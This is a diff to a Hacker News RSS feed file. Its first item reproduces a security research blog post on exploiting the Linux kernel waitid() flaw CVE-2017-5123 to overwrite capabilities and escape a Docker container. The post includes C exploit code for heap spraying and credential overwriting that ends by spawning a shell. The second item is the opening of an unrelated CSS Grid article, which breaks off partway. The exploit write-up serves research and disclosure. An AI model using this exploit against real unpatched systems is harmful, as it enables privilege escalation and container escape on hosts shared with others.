@@ -9,6 +9,652 @@
 <link>https://news.ycombinator.com/newest</link>
 <description>Hacker News RSS</description>
 <item>
+<title>Escaping Docker container using waitid() – CVE-2017-5123</title>
+<link>https://www.twistlock.com/2017/12/27/escaping-docker-container-using-waitid-cve-2017-5123/</link>
+<guid isPermaLink="true" >https://www.twistlock.com/2017/12/27/escaping-docker-container-using-waitid-cve-2017-5123/</guid>
+<description>&lt;div class=&quot;post-author-info&quot;&gt;
+
+&lt;p&gt;Dec 27, 2017&lt;/p&gt;
+&lt;div class=&quot;post-author-name&quot;&gt;by &lt;a href=&quot;https://www.twistlock.com/author/daniel-shapira/&quot; title=&quot;Posts by Daniel Shapira&quot; class=&quot;author url fn&quot; rel=&quot;author&quot;&gt;Daniel Shapira&lt;/a&gt;&lt;/div&gt;
+&lt;span class=&quot;social-share&quot;&gt;share:&lt;/span&gt;
+
+&lt;/div&gt;&lt;p&gt;This post describes how I exploited the &lt;code&gt;waitid()&lt;/code&gt; vulnerability in order to modify the &lt;a href=&quot;https://www.kernel.org/pub/linux/libs/security/linux-privs/kernel-2.2/capfaq-0.2.txt&quot;&gt;Linux capabilities&lt;/a&gt; of a Docker container to gain elevated privileges, and ultimately escape the container jail.&lt;/p&gt;
+&lt;p&gt;But before we dive in, since an image is worth a thousand words, here is my exploit in action. It modifies the containerized process capabilities structure in memory, resulting in a gain of &lt;code&gt;CAP_SYS_ADMIN&lt;/code&gt; and &lt;code&gt;CAP_NET_ADMIN&lt;/code&gt; capabilities. This results in the ability to enable promiscuous mode on &lt;code&gt;eth0&lt;/code&gt; ( docker bridge for the container):&lt;/p&gt;
+
+&lt;p&gt;&lt;iframe width=&quot;960&quot; height=&quot;540&quot; src=&quot;https://www.youtube.com/embed/IdRDFS4u2rQ?feature=oembed&quot; frameborder=&quot;0&quot; gesture=&quot;media&quot; allow=&quot;encrypted-media&quot; allowfullscreen=&quot;&quot;&gt;[embedded content]&lt;/iframe&gt;&lt;/p&gt;
+&lt;p&gt;Note that I have turned off &lt;code&gt;Kernel ASLR&lt;/code&gt; for the recording, but it also works with &lt;code&gt;KASLR&lt;/code&gt; as we can find the kernel base and the heap base by using the same vulnerability.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://access.redhat.com/security/cve/cve-2017-5123&quot;&gt;CVE-2017-5123&lt;/a&gt; was published earlier this year on Oct 12 — it was a Linux kernel vulnerability in the &lt;a href=&quot;http://uw714doc.sco.com/en/man/html.2/waitid.2.html&quot;&gt;&lt;strong&gt;waitid()&lt;/strong&gt;&lt;/a&gt; syscall for 4.12-4.13 kernel versions. The &lt;code&gt;waitid()&lt;/code&gt; syscall defined as :&lt;/p&gt;
+&lt;pre&gt;
+int waitid(idtype_t idtype, id_t id, siginfo_t *infop, int options);
+&lt;/pre&gt;
+&lt;p&gt;The vulnerability allows an attacker to write a partially-controlled data to kernel memory address of his choice. The kernel memory address can be provided as the &lt;code&gt;infop&lt;/code&gt; pointer above. The pointer points to a &lt;code&gt;struct siginfo&lt;/code&gt; described below. In this struct we can control several variables, specifically &lt;code&gt;pid&lt;/code&gt; and &lt;code&gt;status&lt;/code&gt;&lt;em&gt;.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;As you can see below, the control is rather indirect.&lt;br/&gt;&lt;/p&gt;
+&lt;pre&gt;
+struct siginfo {
+    int si_signo;
+    int si_errno;
+    int si_code;
+    int padding;   // this remains unchanged by waitid
+    int pid;       // process id
+    int uid;       // user id
+    int status;    // return code
+}
+&lt;/pre&gt;
+&lt;br/&gt;Most of the values cannot be controlled by us or are limited in their size for our needs, however we can control the &lt;code&gt;pid&lt;/code&gt; value by creating a lot of processes with the help of &lt;code&gt;fork()&lt;/code&gt; or &lt;code&gt;clone()&lt;/code&gt; until we hit the desired &lt;code&gt;pid&lt;/code&gt; value. Still, we are limited by the &lt;code&gt;PID_MAX&lt;/code&gt; value of the system, which is by default configured to be &lt;code&gt;32768&lt;/code&gt; which equals to &lt;code&gt;0x8000&lt;/code&gt; in hex.
+&lt;p&gt;Note: In a non-containerized environment we could elevate this number after changing our &lt;code&gt;uid&lt;/code&gt; to 0 and gain root privileges, as we could modify &lt;code&gt;/proc/sys/kernel/pid_max&lt;/code&gt; to any number.&lt;/p&gt;
+&lt;p&gt;&lt;img class=&quot;alignnone size-full wp-image-5852&quot; src=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/pid_max.png&quot; alt=&quot;&quot; width=&quot;730&quot; height=&quot;54&quot; srcset=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/pid_max.png 730w, https://www.twistlock.com/wp-content/uploads/2017/12/pid_max-300x22.png 300w&quot; sizes=&quot;(max-width: 730px) 100vw, 730px&quot;/&gt;&lt;/p&gt;
+&lt;h2&gt;&lt;strong&gt;Linux Capabilities&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;In this section I’ll focus on a short overview of Linux capabilities – what they are, how Docker uses them, and how they are represented in the memory.&lt;/p&gt;
+&lt;p&gt;The code snippet below is taken from &lt;a href=&quot;https://github.com/torvalds/linux/blob/master/include/linux/cred.h&quot;&gt;&lt;em&gt;linux/cred.h&lt;/em&gt;&lt;/a&gt; and is the definition of the credentials struct that each process has:&lt;br/&gt;&lt;/p&gt;
+&lt;pre&gt;
+struct cred {
+    atomic_t    usage;
+#ifdef CONFIG_DEBUG_CREDENTIALS
+    atomic_t    subscribers;    /* number of processes subscribed */
+    void        *put_addr;
+    unsigned    magic;
+#define CRED_MAGIC    0x43736564
+#define CRED_MAGIC_DEAD    0x44656144
+#endif
+    kuid_t        uid;        /* real UID of the task */
+    kgid_t        gid;        /* real GID of the task */
+    kuid_t        suid;        /* saved UID of the task */
+    kgid_t        sgid;        /* saved GID of the task */
+    kuid_t        euid;        /* effective UID of the task */
+    kgid_t        egid;        /* effective GID of the task */
+    kuid_t        fsuid;        /* UID for VFS ops */
+    Kgid_t    fsgid; /* GID for VFS ops */
+    Unsigned    securebits; /* SUID-less security management */
+    Kernel_cap_t    cap_inheritable; /* caps our children can inherit */
+    Kernel_cap_t    cap_permitted;    /* caps we're permitted */
+    Kernel_cap_t    cap_effective;    /* caps we can actually use */
+    Kernel_cap_t    cap_bset; /* capability bounding set */
+    kernel_cap_t    cap_ambient; /* Ambient capability set */
+
+&lt;/pre&gt;
+&lt;br/&gt;&lt;strong&gt;man capabilities:&lt;/strong&gt;
+&lt;blockquote readability=&quot;10&quot;&gt;
+&lt;p&gt;Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuser into distinct units, known as &lt;em&gt;capabilities&lt;/em&gt;, which can be independently enabled and disabled.&lt;br/&gt;Capabilities are a per-thread attribute.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Linux capabilities are stored inside each process’s own &lt;code&gt;cred struct&lt;/code&gt; and represented by a bitmask. For example all caps enabled would be represented by a bitmask of &lt;code&gt;0xFFFFFFFFFFFFFFFF&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Each capability provides a different set of permissions, for instance:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;CAP_SYS_MODULE&lt;/code&gt;  – allows for loading &amp;amp; unloading kernel modules.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;CAP_NET_ADMIN&lt;/code&gt; – allows for various network operations. For example entering promiscuous mode, interface configuration and more.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;CAP_SYS_ADMIN&lt;/code&gt; – enables a range of system administration operations such as quotactl, mount, umount, swapon, setdomainname, ptrace and much more (this cap gives the most privileges and overloads others).&lt;/p&gt;
+&lt;p&gt;You can find the full list of CAPS &lt;a href=&quot;http://man7.org/linux/man-pages/man7/capabilities.7.html&quot;&gt;over here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Docker uses capabilities to provide a better isolation for containers. It simply drops capabilities that would enable container escape. For example, you will rarely see a container that is running out-of-the-box with any of the 3 capabilities above, as it would be a security concern if a container could access the network interface and sniff the traffic of other containers or the host itself, or if a user inside the container could mount directories on the host and load kernel modules.&lt;/p&gt;
+&lt;p&gt;Although it might be easier to build a &lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming&quot;&gt;ROP chain&lt;/a&gt; and call &lt;code&gt;commit_creds(0)&lt;/code&gt; in order to gain root with full capabilities, in order to learn more about heap spraying, I decided to go with the blind exploitation method by spraying the kernel heap with thousands of &lt;code&gt;struct creds&lt;/code&gt; like Federico did. The downside of the this exploit is that full caps are impossible to reach as we are not in control of what we are writing (we are limited to 0x8000) and the value of &lt;code&gt;0xFFFFFFFFFFFFFFFF&lt;/code&gt; is out of reach for us.&lt;/p&gt;
+&lt;h2&gt;&lt;strong&gt;The vulnerability&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;The code snippet below is taken from &lt;a href=&quot;https://github.com/torvalds/linux/blob/master/kernel/exit.c#L1596&quot;&gt;&lt;em&gt;kernel/exit.c&lt;/em&gt;&lt;/a&gt; and is in charge of handling the &lt;code&gt;waitid()&lt;/code&gt; syscall:&lt;br/&gt;&lt;/p&gt;
+&lt;pre&gt;
+SYSCALL_DEFINE5(waitid, int, which, pid_t, upid, struct siginfo __user *,
+        infop, int, options, struct rusage __user *, ru)
+{
+    struct rusage r;
+    struct waitid_info info = {.status = 0};
+    long err = kernel_waitid(which, upid, &amp;amp;amp;info, options, ru ? &amp;amp;amp;r : NULL);
+    int signo = 0;
+
+    if (err &amp;amp;gt; 0) {
+        signo = SIGCHLD;
+        err = 0;
+        if (ru &amp;amp;amp;&amp;amp;amp; copy_to_user(ru, &amp;amp;amp;r, sizeof(struct rusage)))
+            return -EFAULT;
+    }
+    if (!infop)
+        return err;
+
+    if (!access_ok(VERIFY_WRITE, infop, sizeof(*infop)))
+        return -EFAULT;
+
+    user_access_begin();
+    unsafe_put_user(signo, &amp;amp;amp;infop-&amp;amp;gt;si_signo, Efault);
+    unsafe_put_user(0, &amp;amp;amp;infop-&amp;amp;gt;si_errno, Efault);
+    unsafe_put_user(info.cause, &amp;amp;amp;infop-&amp;amp;gt;si_code, Efault);
+    unsafe_put_user(info.pid, &amp;amp;amp;infop-&amp;amp;gt;si_pid, Efault);
+    unsafe_put_user(info.uid, &amp;amp;amp;infop-&amp;amp;gt;si_uid, Efault);
+    unsafe_put_user(info.status, &amp;amp;amp;infop-&amp;amp;gt;si_status, Efault);
+    user_access_end();
+    return err;
+Efault:
+    user_access_end();
+    return -EFAULT;
+}
+
+&lt;/pre&gt;
+&lt;br/&gt;The vulnerability is that the highlighted &lt;code&gt;access_ok()&lt;/code&gt; check, which ensures that the user specified pointer is in fact a user-space pointer, was missing in the &lt;code&gt;waitid()&lt;/code&gt; syscall. Without this check a user can supply a kernel address pointer and the syscall will write to it without objections when executing &lt;code&gt;unsafe_put_user&lt;/code&gt;.&lt;br/&gt;As we already know – we can’t simply write whatever we want, but we will have to try to gain as much as we can within these limitations.
+&lt;p&gt;&lt;code&gt;Info.status&lt;/code&gt; is a 32 bit int, but the value of status is constrained to &lt;code&gt;0 &amp;amp;lt; status &amp;amp;gt; 256&lt;/code&gt; as we can see in the &lt;a href=&quot;http://tldp.org/LDP/abs/html/exitcodes.html&quot;&gt;exit codes documentation&lt;/a&gt;, and as we already know &lt;code&gt;pid&lt;/code&gt; is constrained by &lt;code&gt;MAX_PID&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;At this point we have the ability to write a value of &lt;code&gt;pid&lt;/code&gt; :  &lt;code&gt;0&lt;/code&gt; &amp;lt; &lt;code&gt;pid&lt;/code&gt; &amp;lt; &lt;code&gt;0x8000&lt;/code&gt; to anywhere we want. The next challenge is to detect where we should write in order to successfully overwrite the desired values.&lt;/p&gt;
+&lt;p&gt;We need to remember that the syscall will actually write 6 different fields each time we execute it, as there will be 6 executions of &lt;code&gt;unsafe_put_user()&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;So we will need to take into account the offset of &lt;code&gt;pid&lt;/code&gt; inside the &lt;code&gt;infop struct&lt;/code&gt; and use it to subtract that value from the target address that we want to write to, the target address is then passed into &lt;code&gt;waitid()&lt;/code&gt; syscall as the &lt;code&gt;infop&lt;/code&gt; pointer.&lt;/p&gt;
+&lt;p&gt;Our main goal with this exploit is to overwrite the capabilities that Docker sets for us, thus gaining additional privileges and to escape the container.&lt;/p&gt;
+&lt;h2&gt;&lt;strong&gt;Spray n’ Pray&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;I decided to take an approach similar to Federico, so I proceeded to spray the kernel heap with thousands of &lt;code&gt;struct creds&lt;/code&gt; and then start guessing by writing to various addresses and pray to hit my target.&lt;/p&gt;
+&lt;p&gt;By picking a value that we can track such as &lt;code&gt;uid&lt;/code&gt; (which we can track with &lt;code&gt;getuid()&lt;/code&gt;).&lt;br/&gt;We can, with a little bit a luck, pinpoint our &lt;code&gt;struct cred&lt;/code&gt; location, after which we will be able to write to specific offsets in order to overwrite the &lt;code&gt;capabilities&lt;/code&gt;, &lt;code&gt;gid&lt;/code&gt;, &lt;code&gt;euid&lt;/code&gt; and anything else we want.&lt;br/&gt;But in order to do that we need to figure out the actual offsets, which we will do with the help of &lt;code&gt;gdb&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img class=&quot;alignnone size-full wp-image-5851&quot; src=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/gdb.png&quot; alt=&quot;&quot; width=&quot;733&quot; height=&quot;170&quot; srcset=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/gdb.png 733w, https://www.twistlock.com/wp-content/uploads/2017/12/gdb-300x70.png 300w&quot; sizes=&quot;(max-width: 733px) 100vw, 733px&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;As we can see, &lt;code&gt;kuid_t&lt;/code&gt; is 4 bytes in size, as such if we found uid on &lt;code&gt;0xFFFF880023cc1004&lt;/code&gt; than &lt;code&gt;gid&lt;/code&gt; will be at &lt;code&gt;0xFFFF880023cc1008&lt;/code&gt;, 4 bytes above, and &lt;code&gt;euid&lt;/code&gt; will be at &lt;code&gt;0xFFFF880023CC1014&lt;/code&gt; which is 4*0x4=0x10 bytes above our &lt;code&gt;uid&lt;/code&gt; address as illustrated in the diagram below.&lt;/p&gt;
+&lt;p&gt;&lt;img class=&quot;alignnone size-full wp-image-5854&quot; src=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/diagram.png&quot; alt=&quot;&quot; width=&quot;414&quot; height=&quot;440&quot; srcset=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/diagram.png 414w, https://www.twistlock.com/wp-content/uploads/2017/12/diagram-282x300.png 282w&quot; sizes=&quot;(max-width: 414px) 100vw, 414px&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;So essentially in order to overwrite our caps we will have to write to:&lt;br/&gt;&lt;code&gt;address_of_uid+0x4*8 = address_of_uid+0x20 = address_of_cap_inheritable&lt;/code&gt;&lt;br/&gt;Note: These addresses are relevant to my system, your addresses might differ.&lt;/p&gt;
+&lt;p&gt;In order to find out where our sprayed &lt;code&gt;cred structs&lt;/code&gt; might land in the heap we will use &lt;code&gt;gdb&lt;/code&gt; again and set a breakpoint on &lt;code&gt;sys_getuid&lt;/code&gt; in order to break when our program calls &lt;code&gt;getuid()&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;A few step commands after the breakpoint (it took 5 on my system) should reveal the &lt;code&gt;cred struct&lt;/code&gt; address in the &lt;code&gt;RAX&lt;/code&gt; register.&lt;/p&gt;
+&lt;p&gt;We can repeat that process of finding the struct for a number of forks in order to collect enough addresses and analyze the statistics of where the &lt;code&gt;struct cred&lt;/code&gt; is most likely to be in the heap&lt;/p&gt;
+&lt;p&gt;So the plan is as follows:&lt;/p&gt;
+&lt;ol&gt;&lt;li&gt;Spawn thousands of processes by calling &lt;code&gt;fork()&lt;/code&gt; in order to create thousands of &lt;code&gt;cred structs&lt;/code&gt; in the kernel heap and make each of the processes constantly check if its UID==0 by calling &lt;code&gt;getuid()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Start writing the value 0 to addresses to which the &lt;code&gt;struct cred-&amp;amp;gt;uid&lt;/code&gt; might land&lt;/li&gt;
+&lt;li&gt;If and when one of our forked processes gets uid==0, it means that we have successfully overwritten the &lt;code&gt;uid&lt;/code&gt; value with our guesses from step 2. Now we can overwrite the rest of the &lt;code&gt;cred struct&lt;/code&gt; and change caps by writing to the offsets that we determined.&lt;/li&gt;
+&lt;/ol&gt;&lt;p&gt;Our dirty exploit will be something to the effect of:&lt;br/&gt;&lt;/p&gt;
+&lt;pre&gt;
+void writecaps(char *addr,unsigned long value){
+while(1) {
+      int pid = clone(exit_func, &amp;amp;amp;new_stack[5000], CLONE_VM | SIGCHLD, NULL);
+      if (!pid) {
+        exit(0);
+      }
+      if (pid == value) {
+        syscall(SYS_waitid, P_PID, pid, addr, WEXITED, NULL);
+        break;
+      }
+}
+
+void spraynpray(){
+pid_t pid;
+FILE *f;
+char *argv[] = {&quot;/bin/sh&quot;, NULL};
+for (int i=0;i&amp;amp;lt;5000;i++)
+{
+    pid = fork();
+    if (pid==0)
+    { // child process
+  while (1) {
+    
+    if (*glob_var==1) {
+      syscall(SYS_exit, 0);
+    }
+    if (getuid() == 0){
+        //FOUND!!
+    printf(&quot;[+] Got UID: 0 !\n&quot;);
+     *glob_var = 1;
+     writecaps((char *)finalcapsaddress,value);
+    printf(&quot;Done, spawning a shell \n&quot;);
+    execve(&quot;/bin/sh&quot;, argv, NULL);
+    }
+}
+    }
+
+    else if(pid&amp;amp;lt;0)
+    {
+        printf(&quot;failed to fork&quot;);
+    }
+
+    else //parent process
+    {
+
+    }
+}
+}
+
+void swapuid(){
+
+    char* i,p;
+    while(*glob_var!=1)
+    {
+    for(i = (char *)0xffff8800321b4004; ; i+=0xc0)
+        {
+        if(*glob_var==1)
+            {
+            break;
+            }
+        printf(&quot;trying %p\n&quot;,i);
+        syscall(__NR_waitid, P_PID, 0,(siginfo_t *)i, WEXITED, NULL);
+        sleep(1);
+        }
+    }
+munmap(glob_var, sizeof *glob_var);
+printf(&quot;Found uid on %p\n&quot;,i-0xc0);
+sleep(10000);
+}
+
+int main(void)
+{
+    glob_var = mmap(NULL, sizeof *glob_var, PROT_READ | PROT_WRITE,
+                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+
+    *glob_var = 0;
+
+unsigned long* base = findbase();
+    findheapbase();
+    spraynpray();
+    swapuid();
+}
+
+&lt;/pre&gt;
+&lt;br/&gt;After analyzing my system (Ubuntu 17.10,Kernel 4.13.0-15, arch x86-64), I found a couple of areas where it seemed that cred struct is more likely to land in about 70% of the executions, but there is still a risk of crashing the machine because we may overwrite something important in the kernel.
+&lt;h2&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;In 2017 alone, &lt;a href=&quot;https://www.cvedetails.com/product/47/Linux-Linux-Kernel.html?vendor_id=33&quot;&gt;434 linux kernel exploits where found&lt;/a&gt;, and as you have seen in this post, kernel exploits can be devastating for containerized environments. This is because containers share the same kernel as the host, thus trusting the built-in protection mechanisms alone isn’t sufficient. Make sure your kernel is always updated on all of your production hosts.&lt;/p&gt;
+&lt;p&gt;Thank you for reading and don’t forget to follow us &lt;a href=&quot;https://twitter.com/TwistlockLabs&quot;&gt;@TwistlockLabs&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Big credits to &lt;a href=&quot;https://reverse.put.as/2017/11/07/exploiting-cve-2017-5123/&quot;&gt;Federico Bento&lt;/a&gt; for pointing some things out and to &lt;a href=&quot;https://salls.github.io/Linux-Kernel-CVE-2017-5123/&quot;&gt;Chris Salls&lt;/a&gt; for his Chrome sandbox escape exploit; my exploitation is heavily based on their work.&lt;/p&gt;
+&lt;div class=&quot;btm-post-author&quot; readability=&quot;33.289473684211&quot;&gt;
+
+&lt;div class=&quot;post-author-wrap&quot; readability=&quot;37.631578947368&quot;&gt;
+&lt;h5 class=&quot;post-author-name&quot;&gt;&lt;a href=&quot;https://www.twistlock.com/author/daniel-shapira/&quot; title=&quot;Posts by Daniel Shapira&quot; class=&quot;author url fn&quot; rel=&quot;author&quot;&gt;Daniel Shapira&lt;/a&gt; | Security Researcher&lt;/h5&gt;
+&lt;p&gt;Daniel is a Twistlock security researcher who embarked on this path as a black-hat hacker at the age of 13, and later on changed hats in order to move to security consulting, penetration testing and lastly security research. Daniel has previously worked at HP Software, WhiteHat Consulting, Nyotron and on numerous freelance security projects in the US &amp;amp; Israel.&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class=&quot;post-pag&quot;&gt;&lt;a href=&quot;https://www.twistlock.com/blog&quot;&gt;← Back to All Posts&lt;/a&gt; &lt;a href=&quot;https://www.twistlock.com/2017/12/19/introduction-serverless-security-part-1/&quot;&gt;Next Post →&lt;/a&gt;&lt;/div&gt;
+</description>
+<pubDate>Fri, 29 Dec 2017 16:06:10 +0000</pubDate>
+<dc:creator>Da5hes</dc:creator>
+<og:type>article</og:type>
+<og:title>Escaping Docker container using waitid() - CVE-2017-5123 | Twistlock</og:title>
+<og:description>Escaping Docker container using waitid() - CVE-2017-5123 from Twistlock. Dev-to-Production Docker and container security for enterprises.</og:description>
+<og:url>https://www.twistlock.com/2017/12/27/escaping-docker-container-using-waitid-cve-2017-5123/</og:url>
+<og:image>https://www.twistlock.com/wp-content/uploads/2017/12/diagram.png</og:image>
+<dc:language>en-US</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>https://www.twistlock.com/2017/12/27/escaping-docker-container-using-waitid-cve-2017-5123/</dc:identifier>
+</item>
+<item>
+<title>From Bootstrap to CSS Grid</title>
+<link>https://open.nytimes.com/bootstrap-to-css-grid-87b3f5f830e4?pagewanted=all</link>
+<guid isPermaLink="true" >https://open.nytimes.com/bootstrap-to-css-grid-87b3f5f830e4?pagewanted=all</guid>
+<description>&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;
+
+&lt;img class=&quot;graf-image&quot; data-image-id=&quot;0*pkfyT6WJt5lNNKkH.&quot; data-width=&quot;610&quot; data-height=&quot;198&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/0*pkfyT6WJt5lNNKkH.&quot;/&gt;&lt;/div&gt;
+&lt;p name=&quot;fd36&quot; id=&quot;fd36&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;Despite many clever hacks and creative workarounds, there hasn’t been a simple answer for creating layout on the web. From misusing tables, to over-engineering simple floats that push around content, developers have consistently struggled to translate designs to code. Developers have been saying for years that there has to be a better way to create responsive websites, and finally, there is: CSS Grid, a proper layout tool for the web baked right into CSS itself, is here. It’s fantastic! It’s exactly what we’ve been waiting for! And yet, it seems to me that developers are hesitating. What’s the hold up?&lt;/p&gt;
+&lt;h4 name=&quot;8d16&quot; id=&quot;8d16&quot; class=&quot;graf graf--h4 graf--startsWithDoubleQuote graf-after--p&quot;&gt;&lt;strong class=&quot;markup--strong markup--h4-strong&quot;&gt;“There’s no way I can start using CSS Grid yet”&lt;/strong&gt;&lt;/h4&gt;
+&lt;p name=&quot;ef59&quot; id=&quot;ef59&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;You’re absolutely ready to declare display: grid if you’re the only person contributing code. However, if you’re working with a bigger team, on an older project or are faced with some real-world constraints, there may be some challenges ahead of you:&lt;/p&gt;
+&lt;ul class=&quot;postList&quot;&gt;&lt;li name=&quot;99cb&quot; id=&quot;99cb&quot; class=&quot;graf graf--li graf-after--p&quot;&gt;Your designers have heard, “No, you can’t do that, that’s not how layout on the web works,” too many times, so they’re not designing anything that calls for you to learn CSS Grid.&lt;/li&gt;
+&lt;li name=&quot;0b6c&quot; id=&quot;0b6c&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;Your developers have heard, “You can’t use that yet, we still have to support x browser,” too many times. They don’t dare dream that all of the excitement about CSS Grid can apply to them quite yet — adding CSS Grid is out of scope.&lt;/li&gt;
+&lt;li name=&quot;27a8&quot; id=&quot;27a8&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;You’re on a tight deadline and you’re still not over how long it took you to really wrap your head around Flexbox. You promise yourself that you’ll take the time learn CSS Grid next time… for the next project… someday.&lt;/li&gt;
+&lt;/ul&gt;&lt;p name=&quot;29a9&quot; id=&quot;29a9&quot; class=&quot;graf graf--p graf-after--li&quot;&gt;If any of the scenarios above sound familiar, then start small with Progressive Enhancement. Use &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/CSS/@supports&quot; data-href=&quot;https://developer.mozilla.org/en-US/docs/Web/CSS/@supports&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;feature queries&lt;/a&gt; to enhance your components with CSS Grid, and worry about deleting old code later. Use the time to show the potential of CSS Grid to your designers. Learn without worrying. You might have to override some styles, but the gains will outweigh the temporary extra code.&lt;/p&gt;
+&lt;h3 name=&quot;81b6&quot; id=&quot;81b6&quot; class=&quot;graf graf--h3 graf-after--p&quot;&gt;&lt;strong class=&quot;markup--strong markup--h3-strong&quot;&gt;Gridlock&lt;/strong&gt;&lt;/h3&gt;
+&lt;h4 name=&quot;a321&quot; id=&quot;a321&quot; class=&quot;graf graf--h4 graf--startsWithDoubleQuote graf-after--h3&quot;&gt;&lt;strong class=&quot;markup--strong markup--h4-strong&quot;&gt;“That sounds nice, but I can’t use CSS Grid, we’re still on Bootstrap!”&lt;/strong&gt;&lt;/h4&gt;
+&lt;p name=&quot;d0f3&quot; id=&quot;d0f3&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;Don’t let that stop you from progressively enhancing your app with the new and exciting features of CSS!&lt;/p&gt;
+&lt;p name=&quot;16b4&quot; id=&quot;16b4&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;CSS is a powerful tool and remarkably flexible. I made an &lt;a href=&quot;https://codepen.io/tallys/pen/bRrLYV&quot; data-href=&quot;https://codepen.io/tallys/pen/bRrLYV&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;example on Codepen&lt;/a&gt; that embraces CSS Grid without removing the Bootstrap code or functionality for old browsers. Try it out, resize your browser, and then toggle off the CSS Grid enhancement. I tried to make just about every breakpoint a little different to show the creativity and flexibility made possible with CSS Grid. Fork it, play around and make something new. It’s just an example, and I hope you have fun with it.&lt;/p&gt;
+
+Codepen Example
+&lt;h4 name=&quot;7e6b&quot; id=&quot;7e6b&quot; class=&quot;graf graf--h4 graf--startsWithDoubleQuote graf-after--figure&quot;&gt;&lt;strong class=&quot;markup--strong markup--h4-strong&quot;&gt;“Why didn’t you just use Bootstrap? There’s hardly any difference!”&lt;/strong&gt;&lt;/h4&gt;
+&lt;p name=&quot;dd84&quot; id=&quot;dd84&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;Yeah, yeah. Listen, I get that I could have just used Bootstrap and called it a day; it works just fine, and it’s incredibly fast to throw together once it’s already on a project. That’s why it’s still the fallback.&lt;/p&gt;
+&lt;p name=&quot;d8af&quot; id=&quot;d8af&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;But once you get a glimpse of the future, it’s hard to stay in the past. I have seen the power and potential of CSS Grid and I wanted to start using it. Or, more specifically:&lt;/p&gt;
+&lt;ul class=&quot;postList&quot;&gt;&lt;li name=&quot;f8e6&quot; id=&quot;f8e6&quot; class=&quot;graf graf--li graf-after--p&quot;&gt;I didn’t want to declare a height to accommodate the maximum content. I would much rather have the rows know how tall each item should be.&lt;/li&gt;
+&lt;li name=&quot;21e1&quot; id=&quot;21e1&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;I wanted the option of having variable widths for each item, and I didn’t want to have them be split evenly or predictably all of the time.&lt;/li&gt;
+&lt;li name=&quot;e22f&quot; id=&quot;e22f&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;I was bored by having to always think in terms of 12 columns. Lots of websites use 12 columns and they all look the same.&lt;/li&gt;
+&lt;li name=&quot;e796&quot; id=&quot;e796&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;I felt trapped by fixed breakpoints for columns, and I wanted to set my own breakpoints to best serve my content.&lt;/li&gt;
+&lt;li name=&quot;6e6c&quot; id=&quot;6e6c&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;I didn’t want to keep making the choice between affecting global layout rules and writing hacky overrides.&lt;/li&gt;
+&lt;li name=&quot;5c64&quot; id=&quot;5c64&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;I wanted to easily change the gap between my columns. Sometimes a 3px column gap is all you need.&lt;/li&gt;
+&lt;li name=&quot;44fa&quot; id=&quot;44fa&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;I wanted to be able to set a min and max for each item and let the browser figure out how many items fit in each row. I am a huge fan of letting the browser do the math.&lt;/li&gt;
+&lt;li name=&quot;53c5&quot; id=&quot;53c5&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;It took about three lines of CSS to write the grid layout I wanted, and I wanted to live in the bright and beautiful future where layout is always that simple.&lt;/li&gt;
+&lt;/ul&gt;&lt;p name=&quot;9550&quot; id=&quot;9550&quot; class=&quot;graf graf--p graf-after--li&quot;&gt;Most importantly, I wanted to be excited about layout on the web again, and I wanted the designers I work with to feel the same.&lt;/p&gt;
+&lt;h4 name=&quot;4c90&quot; id=&quot;4c90&quot; class=&quot;graf graf--h4 graf--startsWithDoubleQuote graf-after--p&quot;&gt;&lt;strong class=&quot;markup--strong markup--h4-strong&quot;&gt;“Won’t I just be writing throwaway code?”&lt;/strong&gt;&lt;/h4&gt;
